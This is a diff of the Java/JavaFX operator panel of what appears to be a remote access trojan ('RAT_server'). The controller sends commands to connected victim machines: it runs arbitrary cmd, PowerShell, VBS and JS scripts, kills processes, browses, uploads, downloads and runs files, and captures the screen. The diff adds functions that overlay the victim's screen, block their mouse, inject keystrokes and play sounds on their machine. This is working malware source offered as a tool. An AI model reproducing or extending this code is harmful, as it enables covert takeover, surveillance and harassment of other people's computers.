@@ -4,18 +4,12 @@ import java.awt.Toolkit;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
 import java.io.File;
-import java.net.URISyntaxException;
-import java.security.CodeSource;
+import java.io.IOException;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.Collections;
-import java.util.Iterator;
 import java.util.List;
 import java.util.Optional;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
-import java.util.concurrent.locks.LockSupport;
-
 import org.json.simple.JSONObject;
 
 import electron.RAT_server;
@@ -40,6 +34,8 @@ import javafx.collections.ObservableList;
 import javafx.embed.swing.SwingFXUtils;
 import javafx.event.EventHandler;
 import javafx.fxml.FXML;
+import javafx.fxml.FXMLLoader;
+import javafx.scene.Scene;
 import javafx.scene.control.*;
 import javafx.scene.control.Alert.AlertType;
 import javafx.scene.image.Image;
@@ -51,6 +47,7 @@ import javafx.scene.input.MouseButton;
 import javafx.scene.layout.AnchorPane;
 import javafx.scene.text.Text;
 import javafx.stage.FileChooser;
+import javafx.stage.Stage;
 
 public class MainWindowControls {
 	public static SocketHandler handler;
@@ -126,17 +123,9 @@ public class MainWindowControls {
 	@FXML
 	private CheckBox screen_mode;
 	@FXML
+	private TextField screen_keyfield;
+	@FXML
 	private ImageView screenv2_image;
-	@FXML
-	private TextField messagebox_header;
-	@FXML
-	private TextField messagebox_text;
-	@FXML
-	private TextField messagebox_title;
-	@FXML
-	private ChoiceBox<String> messagebox_type;
-	@FXML
-	private TextArea messagebox_console;
 	@FXML
 	private TextArea script_code;
 	@FXML
@@ -145,6 +134,8 @@ public class MainWindowControls {
 	private TextField settings_uitimeupdater;
 	@FXML
 	private CheckBox settings_screenv2;
+	@FXML
+	private CheckBox settings_contextmenurexplorer;
 
 	@FXML
 	private void initialize() {
@@ -157,21 +148,11 @@ public class MainWindowControls {
 				}
 			}
 		});
-		// Generating items for ChoiceBoxes
-		ObservableList<String> msbti = FXCollections.observableArrayList();
-		msbti.add("INFO");
-		msbti.add("ERROR");
-		msbti.add("WARN");
-		msbti.add("INPUT");
-		msbti.add("CONFIRMATION");
-		messagebox_type.setItems(msbti);
 		ObservableList<String> executorsChoices = FXCollections.observableArrayList("cmd", "bat", "ps1", "psconsole",
 				"vbs", "js");
 		script_executor.setItems(executorsChoices);
 		script_executor.getSelectionModel().select(0);
 		// Styling some components
-		messagebox_console.setStyle(
-				"-fx-control-inner-background:#000000; -fx-font-family: Consolas; -fx-highlight-fill: #00ff00; -fx-highlight-text-fill: #000000; -fx-text-fill: #00ff00; ");
 		console_consoleview.setStyle(
 				"-fx-control-inner-background:#000000; -fx-font-family: Consolas; -fx-highlight-fill: #00ff00; -fx-highlight-text-fill: #000000; -fx-text-fill: #00ff00; ");
 		String taskmgrstyle = getClass().getResource("/resources/taskmgr.css").toExternalForm();
@@ -190,6 +171,7 @@ public class MainWindowControls {
 				explorer_openAction();
 			}
 		});
+
 		// Creating update thread
 //		ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
 //		executor.scheduleAtFixedRate(() -> {
@@ -198,6 +180,7 @@ public class MainWindowControls {
 //			});
 //		}, 0, Integer.parseInt(settings_uitimeupdater.getText()), TimeUnit.MICROSECONDS);
 		Runnable updateRunnable = new Runnable() {
+			@SuppressWarnings("static-access")
 			@Override
 			public void run() {
 				while (true) {
@@ -209,9 +192,14 @@ public class MainWindowControls {
 						Thread.currentThread().sleep(Integer.parseInt(settings_uitimeupdater.getText()));
 					} catch (NumberFormatException | InterruptedException e) {
 						logger.error("[UI_UPDATE_TASK]: can't update! Message: " + e.getMessage());
-						Utils.showErrorMessage("Critical error", "UI error", "Can't update UI! Message: "
-								+ e.getMessage() + "\n You must restart program to work with UI.");
-						break;
+						Platform.runLater(() -> {
+							Alert erralert = new Alert(AlertType.ERROR);
+							erralert.setHeaderText("UI error");
+							erralert.setTitle("Critical error");
+							erralert.setContentText("Can't update UI! Message: " + e.getMessage()
+									+ "\n Try to change value in TextField.");
+							erralert.showAndWait();
+						});
 					}
 				}
 			}
@@ -299,8 +287,6 @@ public class MainWindowControls {
 			updateExplorer();
 		} else if (tabName.equals("Screen")) {
 			updateScreen();
-		} else if (tabName.equals("MessageBox")) {
-			updateMessageBox();
 		} else if (tabName.equals("ScreenV2")) {
 			updateScreenV2();
 		} else if (tabName.equals("Tasks")) {
@@ -318,7 +304,7 @@ public class MainWindowControls {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
 					"Select client in 'Connections' pane firstly.");
-			logger.log("[electron.user.MainWindowControls.script_executeAction]: handler = null");
+			logger.log("[electron.gui.MainWindowControls.script_executeAction]: handler = null");
 			return;
 		}
 		// Defining executor type
@@ -328,7 +314,7 @@ public class MainWindowControls {
 		case "cmd":
 			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_CMD, script);
 			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
+				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
 				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
 						"Error sending script packet. Caused by SocketHandler.");
 			}
@@ -336,7 +322,7 @@ public class MainWindowControls {
 		case "ps1":
 			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_POWERSHELL, script);
 			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
+				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
 				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
 						"Error sending script packet. Caused by SocketHandler.");
 			}
@@ -344,7 +330,7 @@ public class MainWindowControls {
 		case "psconsole":
 			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_POWERSHELL_CONSOLE, script);
 			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
+				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
 				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
 						"Error sending script packet. Caused by SocketHandler.");
 			}
@@ -352,7 +338,7 @@ public class MainWindowControls {
 		case "vbs":
 			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_VBS, script);
 			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
+				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
 				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
 						"Error sending script packet. Caused by SocketHandler.");
 			}
@@ -360,7 +346,7 @@ public class MainWindowControls {
 		case "bat":
 			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_BAT, script);
 			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
+				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
 				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
 						"Error sending script packet. Caused by SocketHandler.");
 			}
@@ -368,7 +354,7 @@ public class MainWindowControls {
 		case "js":
 			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_JS, script);
 			if (!handler.send(packet.get().toJSONString())) {
-				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
+				logger.error("[electron.gui.MainWindowControls.script_executeAction]: error sending packet.");
 				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
 						"Error sending script packet. Caused by SocketHandler.");
 			}
@@ -392,7 +378,7 @@ public class MainWindowControls {
 		fileChooser.setInitialDirectory(new File("scripts"));
 		File file = fileChooser.showOpenDialog(RAT_server.getInitialStage());
 		if (file != null) {
-			logger.log("[electron.user.MainWindowControls.script_importAction]: importing: " + file.getAbsolutePath());
+			logger.log("[electron.gui.MainWindowControls.script_importAction]: importing: " + file.getAbsolutePath());
 			String result = Utils.getFileLineWithSeparator(Utils.getFileLines(file.getAbsolutePath()), "\n");
 			script_code.setText(result);
 		}
@@ -407,15 +393,11 @@ public class MainWindowControls {
 			return;
 		}
 		tasks_time.setText(handler.getLastTaskmgrDate());
-		OutputPacket packet;
 		// If fastmode enabled
 		if (tasks_fastmode.isSelected()) {
-			packet = new OutputPacket("/tasklistfast");
+			OutputPacket.sendOutPacket("/tasklistfast");
 		} else {
-			packet = new OutputPacket("/tasklist");
-		}
-		if (!handler.send(packet.get())) {
-			logger.error("[electron.user.MainWindowControls.updateTasks]: error sending packet.");
+			OutputPacket.sendOutPacket("/tasklist");
 		}
 		if (handler.getTaskList() == null) {
 			return;
@@ -474,16 +456,10 @@ public class MainWindowControls {
 		}
 		if (!packet.getSession().getValue().equalsIgnoreCase("Linux")) {
 			// Windows
-			OutputPacket packet1 = new OutputPacket("taskkill /pid " + packet.getPid().getValue() + " /t /f");
-			if (!handler.send(packet1.get())) {
-				logger.error("[electron.user.MainWindowControls.tasks_killAction]: error sending packet.");
-			}
+			OutputPacket.sendOutPacket("taskkill /pid " + packet.getPid().getValue() + " /t /f");
 		} else {
 			// Linux
-			OutputPacket packet2 = new OutputPacket("kill -9 " + packet.getPid().getValue());
-			if (!handler.send(packet2.get())) {
-				logger.error("[electron.user.MainWindowControls.tasks_killAction]: error sending packet.");
-			}
+			OutputPacket.sendOutPacket("kill -9 " + packet.getPid().getValue());
 		}
 	}
 
@@ -496,35 +472,6 @@ public class MainWindowControls {
 		Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
 		clipboard.setContents(stringSelection, null);
 		Utils.showMessage("Success", "Success", "Copied text to chipboard.");
-	}
-
-	/*
-	 * MessageBox Tab Controls
-	 */
-	private void updateMessageBox() {
-		if (handler == null) {
-			return;
-		}
-		// Updating console
-	}
-
-	@FXML
-	private void messagebox_send() {
-		if (handler == null) {
-			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.");
-			logger.log("[electron.user.MainWindowControls.messagebox_send]: handler = null");
-			return;
-		}
-		// Getting data
-		String title = messagebox_title.getText();
-		String header = messagebox_header.getText();
-		String text = messagebox_text.getText();
-		int type = messagebox_type.getSelectionModel().getSelectedIndex();
-		// Cleaning text
-		messagebox_title.setText("");
-		messagebox_header.setText("");
-		messagebox_text.setText("");
 	}
 
 	/*
@@ -548,17 +495,52 @@ public class MainWindowControls {
 	}
 
 	@FXML
+	private void screen_overlayAction() {
+		OutputPacket.sendOutPacket("/overlay");
+	}
+
+	@FXML
+	private void screen_blockMouseAction() {
+		OutputPacket.sendOutPacket("/blockmouse");
+	}
+
+	@FXML
+	private void screen_sendkeysAction() {
+		if (handler == null) {
+			Utils.showErrorMessage("Incorrect action", "You must select client first!",
+					"Select client in 'Connections' pane firstly.");
+			return;
+		}
+		String keys = screen_keyfield.getText();
+		if (keys.isEmpty()) {
+			return;
+		}
+		if (keys.contains(" ")) {
+			OutputPacket.sendOutPacket("/presskeys " + keys);
+			return;
+		}
+		OutputPacket.sendOutPacket("/presskey " + keys);
+		return;
+	}
+
+	@FXML
 	private void toggleScreen() {
 		if (handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
 					"Select client in 'Connections' pane firstly.");
 			return;
 		}
-		OutputPacket packet = new OutputPacket("/screen");
-		// Sending it to selected client
-		if (!handler.send(packet.get())) {
-			logger.error("[electron.user.MainWindowControls.toggleScreen]: error sending packet.");
-		}
+		OutputPacket.sendOutPacket("/screen");
+	}
+
+	@FXML
+	private void settings_createParentScreen() throws IOException {
+		ScreenViewControls.create();
+	}
+
+	@FXML
+	private void settings_launchPlayerGui() {
+		OutputPacket.sendOutPacket("/player soundpacket");
 	}
 
 	/*
@@ -584,11 +566,7 @@ public class MainWindowControls {
 					"Select client in 'Connections' pane firstly.");
 			return;
 		}
-		OutputPacket packet = new OutputPacket("/screenv2");
-		// Sending it to selected client
-		if (!handler.send(packet.get())) {
-			logger.error("[electron.user.MainWindowControls.toggleScreenV2]: error sending packet.");
-		}
+		OutputPacket.sendOutPacket("/screenv2");
 	}
 
 	/*
@@ -640,17 +618,10 @@ public class MainWindowControls {
 			Utils.showMessage("Incorrect action", "You must select file to open", "You must select file to open");
 		} else {
 			String f = explorer_list.getSelectionModel().getSelectedItem();
-			// Creating packet to send
-			OutputPacket packet;
 			if (handler.isWindows()) {
-				packet = new OutputPacket("cd " + explorer_path.getText() + "&start " + f);
+				OutputPacket.sendOutPacket("cd " + explorer_path.getText() + "&start " + f);
 			} else {
-				packet = new OutputPacket("cd " + explorer_path.getText() + "; ./ " + f);
-			}
-			// Sending it to selected client
-			if (!handler.send(packet.get())) {
-				logger.error("[electron.user.MainWindowControls.explorer_runAction]: error sending packet.");
-				return;
+				OutputPacket.sendOutPacket("cd " + explorer_path.getText() + "; ./ " + f);
 			}
 			Utils.showMessage("runAction", "Success", "Started file: " + f);
 		}
@@ -668,12 +639,7 @@ public class MainWindowControls {
 		} else {
 			String f = explorer_list.getSelectionModel().getSelectedItem();
 			// Creating packet to send
-			OutputPacket packet = new OutputPacket("cd " + explorer_path.getText() + "&" + "\"" + f + "\"");
-			// Sending it to selected client
-			if (!handler.send(packet.get())) {
-				logger.error("[electron.user.MainWindowControls.explorer_runListenerAction]: error sending packet.");
-				return;
-			}
+			OutputPacket.sendOutPacket("cd " + explorer_path.getText() + "&" + "\"" + f + "\"");
 			Utils.showMessage("runListenerAction", "Success", "Started file: " + f);
 		}
 	}
@@ -696,6 +662,7 @@ public class MainWindowControls {
 
 	@FXML
 	private void explorer_backAction() {
+		// Linux unsupported.
 		File f = new File(explorer_path.getText());
 		explorer_path.setText(f.getParent());
 		sendExplorer();
@@ -713,7 +680,7 @@ public class MainWindowControls {
 		td.setContentText("Enter file to create:");
 		Optional<String> a = td.showAndWait();
 		String fname = a.get();
-		logger.log("[electron.user.MainWindowControls.explorer_createAction] creating file: " + fname);
+		logger.log("[electron.gui.MainWindowControls.explorer_createAction] creating file: " + fname);
 		String result = explorer_path.getText();
 		if (result.endsWith("/") || result.endsWith("\\")) {
 			result = result + fname;
@@ -762,15 +729,19 @@ public class MainWindowControls {
 			} else {
 				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
 			}
-			OutputPacket packet = new OutputPacket("/edit=" + result);
-			if (!handler.send(packet.get())) {
-				logger.error("[electron.user.MainWindowControls.explorer_editAction]: error sending packet.");
-			}
+			OutputPacket.sendOutPacket("/edit=" + result);
 		}
 	}
 
 	@FXML
 	private void explorer_contextOpened() {
+		if (settings_contextmenurexplorer.isSelected()) {
+			// If bypassing enabled
+			explorer_playfunction.setVisible(true);
+			explorer_runlistenerfunction.setVisible(true);
+			explorer_editfunction.setVisible(true);
+			return;
+		}
 		if (!explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
 			explorer_playfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().endsWith(".wav"));
 			explorer_runlistenerfunction.setVisible(handler.isWindows());
@@ -791,14 +762,11 @@ public class MainWindowControls {
 		} else {
 			result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
 		}
-		// Creating packet to send
-		OutputPacket packet = new OutputPacket("/player " + result);
-		// Sending it to selected client
-		if (!handler.send(packet.get())) {
-			logger.error("[electron.user.MainWindowControls.explorer_play]: error sending packet.");
-		}
+		OutputPacket.sendOutPacket("/player " + result);
+		OutputPacket.sendOutPacket("/player soundpacket");
 	}
 
+	@SuppressWarnings("unchecked")
 	@FXML
 	private void explorer_upload() {
 		if (handler == null) {
@@ -822,6 +790,7 @@ public class MainWindowControls {
 		}
 	}
 
+	@SuppressWarnings("unchecked")
 	@FXML
 	private void explorer_download() {
 		if (handler == null) {
@@ -860,7 +829,6 @@ public class MainWindowControls {
 	@FXML
 	private void sendExplorer() {
 		if (handler == null) {
-			logger.log("[electron.user.MainWindowControls.sendExplorer]: handler = null");
 			return;
 		}
 		ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "");
@@ -915,11 +883,7 @@ public class MainWindowControls {
 		}
 		String command = console_commandfield.getText();
 		// Creating packet to send
-		OutputPacket packet = new OutputPacket(command);
-		// Sending it to selected client
-		if (!handler.send(packet.get())) {
-			logger.error("[electron.user.MainWindowControls.sendCommand]: error sending packet.");
-		}
+		OutputPacket.sendOutPacket(command);
 		handler.addMessageToLog("[SERVER]: sending: " + console_commandfield.getText());
 		console_commandfield.setText("");
 	}
